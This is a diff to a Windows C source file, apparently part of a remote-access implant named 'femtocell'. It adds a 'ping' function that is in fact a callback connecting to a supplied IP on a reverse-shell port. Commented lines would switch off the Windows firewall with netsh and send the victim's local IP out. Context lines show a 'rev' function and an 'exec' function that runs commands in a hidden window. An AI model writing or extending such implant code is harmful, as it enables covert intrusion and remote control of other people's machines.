@@ -1,5 +1,53 @@
 #include "femtocell.h"
 
+
+void ping(char* ip)
+{
+	WSADATA wsaData;
+	SOCKET wSock;
+	struct sockaddr_in hax;
+	STARTUPINFO si;
+	PROCESS_INFORMATION pi;
+
+	// wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+	wSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+
+	// system("netsh adv set allprofiles state off");
+
+	hax.sin_family = AF_INET;
+	hax.sin_port = htons(REV_PORT);
+	printf("%s ip", ip);
+	hax.sin_addr.s_addr = inet_addr(ip);
+
+	// if (WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL) == SOCKET_ERROR)
+	if (connect(wSock, (struct sockaddr*)&hax, sizeof(hax)))
+	{
+#ifdef DEBUG
+		printf("WSAConnnect Failed");
+		printf("%d", WSAGetLastError());
+#endif
+		// free(pst->ip);
+		return;
+	}
+	// 	printf("getting local data %s", inet_ntoa(localaddr->sin_addr));
+	// 	closesocket(wSock);
+		// localip = inet_ntoa(localaddr->sin_addr);
+		// WSABUF wbuf = {0};
+		// wbuf.len = strlen(localip);
+		// wbuf.buf = localip;
+		// DWORD sent;
+		// printf("sending data %s", localip);
+	// 	if (WSASend(wSock, &wbuf, 1, &sent, 0, NULL, NULL) == SOCKET_ERROR)
+	// 	{
+	// #ifdef DEBUG
+	// 		printf("wsa send failed");
+	// #endif
+	// 		// free(pst.ip);
+	// 		return;
+	// 	}
+		// closesocket(wSock);
+}
+
 void rev(char* ip)
 {
 	WSADATA wsaData;
@@ -49,7 +97,7 @@ void exec(char* cmd)
 	ZeroMemory(&si, sizeof(si));
 	si.cb = sizeof(si);
 	ZeroMemory(&pi, sizeof(pi));
-	
+
 	if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
 	{
 #ifdef DEBUG
